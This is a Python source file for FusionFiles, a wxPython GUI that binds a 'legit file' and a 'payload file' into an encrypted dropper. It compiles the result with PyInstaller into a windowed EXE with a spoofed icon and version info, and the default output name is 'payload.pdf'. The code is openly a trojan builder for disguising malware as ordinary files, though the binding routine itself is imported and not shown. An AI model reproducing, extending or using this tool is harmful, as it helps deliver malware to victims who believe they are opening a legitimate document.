"""
Author: PoseidOwn
Source: https://github.com/Poseidown/fusion-files
Disclaimer: Do NOT use on any computer that you do not have explicit permission or own personally.
"""
## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.
#
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
## GNU General Public License at (http://www.gnu.org/licenses/) for
## more details.
import wx
import os
import Gui
from filebinder import main as filebinder
import subprocess
import json
import sys
import win32api
import winerror
import win32event
import datetime

######################
# CombineFiles Class #
######################
class CombineFiles(Gui.MainFrame):
    global encrypt_option
    global _LEGITFILE
    global _PAYLOADFILE
    global _VERSIONFILE
    global _ICONFILE
    _VERSIONFILE = False
    _ICONFILE = False

    def __init__(self, parent):
        # Prevent multiple copies of FusionFiles to run
        mutex = win32event.CreateMutex(None, 1, "gTAvwfs52rg")  # mutex_rr_windows
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            self.error_out()
        Gui.MainFrame.__init__(self, parent)
        #  Set the bmp Icon for the file (the one that shows up in the far left of the top bar). Not working when created as EXE.
        #self.SetIcon(wx.Icon("resources\\logo.bmp", wx.BITMAP_TYPE_ANY))
        #  Setup Console Box
        self.console = Console(self.ConsoleBoxTextCtrl)
        #  Provide first Ready message to user
        self.console.log(msg="Ready...")
        #  Change Status Bar to Ready also
        self.StatusBar.SetStatusText("Ready...")

        #  When Combine Files button is hit on GUI, this function will run
    def BuildFinal(self, event):
        myobject = event.GetEventObject()
        myobject.Disable()
        dir_path = os.path.dirname(os.path.realpath(__file__))
        encrypt_option = self.EncryptDropperCheckBox.IsChecked()
        self.StatusBar.SetStatusText("Running...")
        the_msg= "-"*5 + " Combine Setup " + "-"*5 + "\n[Legit File] %s\n[Payload File] %s" % (_LEGITFILE,
                                                                                               _PAYLOADFILE)
        if _VERSIONFILE:
            the_msg += "\n[Version File] %s" % _VERSIONFILE
        if _ICONFILE:
            the_msg += "\n[Icon File] %s" % _ICONFILE
        self.console.log(msg="%s" % the_msg)
        self.console.log(msg="-" * 30)
        choice = self.SetExtractDir()
        output_file = self.OutputFileTextCtrl.GetValue()
        filebinder(_PAYLOADFILE, _LEGITFILE, output_file, choice,
                        encrypt_option)
        cmd = "pyinstaller -F --windowed %s" % output_file + ".py"
        if _ICONFILE:
            cmd += " --icon=%s" % _ICONFILE
        if _VERSIONFILE:
            cmd += " --version-file=%s" % _VERSIONFILE
        subprocess.call('%s' % cmd, shell=True)
        output_file_exe = dir_path + "\\" "dist" + "\\" + output_file + ".exe"
        if os.path.isfile(output_file_exe):
            self.StatusBar.SetStatusText("Finished!")
            self.console.log(msg="Success!")
            self.console.log(msg="File created at: %s" % output_file_exe)
            output_file = dir_path + "\\" + output_file + ".py"
            #  Cleanup un-needed files
            if os.path.isfile(output_file):
                os.remove(output_file)
            output_file = output_file[:-3] + ".spec"
            if os.path.isfile(output_file):
                os.remove(output_file)
        else:
            self.console.log(msg="Failure in creating file!")
        myobject.Enable()
        self.StatusBar.SetStatusText("Ready...")

    def error_out(self, msg="This program is already running!"):
        mutex = None
        app = wx.App()
        error_dialog = wx.MessageDialog(None, msg,
                                        "Error", wx.OK | wx.ICON_ERROR)
        error_dialog.ShowModal()
        app.MainLoop()
        sys.exit()

    def UpdateLegitFile(self, event):
        global _LEGITFILE
        formatted_path = self.LoadLegitFile.GetPath()
        self.LegitFileTextCtrl.SetLabel("%s" % formatted_path)
        _LEGITFILE = formatted_path

    def UpdatePayloadFile(self, event):
        global _PAYLOADFILE
        formatted_path = self.LoadPayloadFile.GetPath()
        self.PayloadFileTextCtrl.SetLabel("%s" % formatted_path)
        _PAYLOADFILE = formatted_path

    def UpdateVersionFile(self, event):
        global _VERSIONFILE
        formatted_path = self.LoadVersionFile.GetPath()
        self.VersionFileTextCtrl.SetLabel("%s" % formatted_path)
        _VERSIONFILE = formatted_path

    def UpdateIconFile(self, event):
        global _ICONFILE
        formatted_path = self.LoadIconFile.GetPath()
        self.IconFileTextCtrl.SetLabel("%s" % formatted_path)
        _ICONFILE = formatted_path

    def ClearOptions(self, event):
        global _VERSIONFILE
        global _ICONFILE
        self.LegitFileTextCtrl.SetLabel("None")
        self.PayloadFileTextCtrl.SetLabel("None")
        self.VersionFileTextCtrl.SetLabel("None")
        self.IconFileTextCtrl.SetLabel("None")
        self.OutputFileTextCtrl.SetLabel("payload.pdf")
        self.console.log(msg="Options Cleared.")
        self.SystemEnvChoice.SetSelection(0)
        self.EncryptDropperCheckBox.SetValue(True)
        self.console.clear()
        self.StatusBar.SetStatusText("Ready...")
        _VERSIONFILE = False
        _ICONFILE = False

    def CreateConfig(self, event):
        config_name = self.SaveConfigFile.GetPath()
        self.StatusBar.SetStatusText(config_name)
        self.console.log(msg="Creating Config file: %s" % config_name)
        ExtractDir = self.SetExtractConfigDir()
        config = {'LegitFile': '%s' % _LEGITFILE, 'PayloadFile': '%s' % _PAYLOADFILE,
                  'VersionFile': '%s' % _VERSIONFILE, 'IconFile': '%s' % _ICONFILE, 'ExtractDir': '%s' % ExtractDir}

        with open(config_name, 'w') as f:
            json.dump(config, f)
        self.StatusBar.SetStatusText("Created Config: %s" % config_name)

    def SetExtractConfigDir(self):
        formatted_path = self.SetExtractDir()
        options = {
            "HOMEPATH": "0",
            "TEMP": "1",
            "APPDATA": "2"
        }
        choice = options[formatted_path]
        return choice

    def SetExtractDir(self):
        options = {
            "0": "HOMEPATH",
            "1": "TEMP",
            "2": "APPDATA"
        }
        formatted_path = self.SystemEnvChoice.GetSelection()
        choice = options[str(formatted_path)]
        return choice

    def ReadConfig(self, event):
        global _LEGITFILE
        global _PAYLOADFILE
        global _VERSIONFILE
        global _ICONFILE
        config_name = self.LoadConfigFile.GetPath()
        self.console.log(msg="Loading Config File: %s" % config_name)
        self.StatusBar.SetStatusText("Loaded Config File: %s" % config_name)
        with open(config_name, 'r') as f:
            config = json.load(f)

        self.LegitFileTextCtrl.SetLabel("%s" % config['LegitFile'])
        _LEGITFILE = config['LegitFile']
        self.PayloadFileTextCtrl.SetLabel("%s" % config['PayloadFile'])
        _PAYLOADFILE = config['PayloadFile']
        self.VersionFileTextCtrl.SetLabel("%s" % config['VersionFile'])
        _VERSIONFILE = config['VersionFile']
        self.IconFileTextCtrl.SetLabel("%s" % config['IconFile'])
        _ICONFILE = config['IconFile']
        self.SystemEnvChoice.SetSelection(int(config['ExtractDir']))

###################
## CONSOLE CLASS ##
###################
class Console:
    '''
    @summary: Provides an interface for the GUI Console window
    '''

    def __init__(self, console):
        '''
        @summary: Constructor
        @param console: Handle to the wxPython console TextCtrl
        '''
        self.__console_box = console
        self.__debug_level = "0 - Minimal"

    def log(self, debug_level=0, _class=None, msg=None, ccode=0, timestamp=True):
        '''
        @summary: Logs output to the Console
        @param debug_level: The debug level of the message
        @param _class: The class that is performing the log
        @param msg: The message to log to the Console Text screen
        '''
        to_log = ""

        # Add timestamp
        if timestamp:
            to_log += "[%s]: " % self.__get_timestamp()

        # Add status message
        if ccode:
            to_log += "(ERROR): "

        # Add class
        if _class:
            to_log += "%s: " % _class

        # Add message
        to_log += "%s" % msg

        # Add the message to the Console box
        if msg and debug_level <= int(self.__debug_level[0]):
            self.__console_box.AppendText(to_log + "\n")

    def clear(self):
        '''
        @summary: Clears the Console output screen
        '''

        self.__console_box.Clear()

    def __get_timestamp(self):
        '''
        @summary: Return timestamp string
        '''

        current_time = datetime.datetime.now()
        time_output = "%s-%s-%s %s:%s:%s" % (
            current_time.year,
            current_time.month if current_time.month >= 10 else "0%s" % current_time.month,
            current_time.day if current_time.day >= 10 else "0%s" % current_time.day,
            current_time.hour if current_time.hour >= 10 else "0%s" % current_time.hour,
            current_time.minute if current_time.minute >= 10 else "0%s" % current_time.minute,
            current_time.second if current_time.second >= 10 else "0%s" % current_time.second
        )

        return time_output

    def set_debug_level(self, level):
        '''
        @summary: Sets the console logging debug level. Messages below the debug level
        will be ignored, and won't be logged to the console.
        @param level: The debug level to set to console to. Should be one of the following:
            "0 - Minimal"
            "1 - Low"
            "2 - Medium"
            "3 - High"
        '''

        self.__debug_level = level

if __name__ == "__main__":
    app = wx.App(False)
    # create an object of CalcFrame
    frame = CombineFiles(None)
    # show the frame
    frame.Show(True)
    # start the applications
    app.MainLoop()
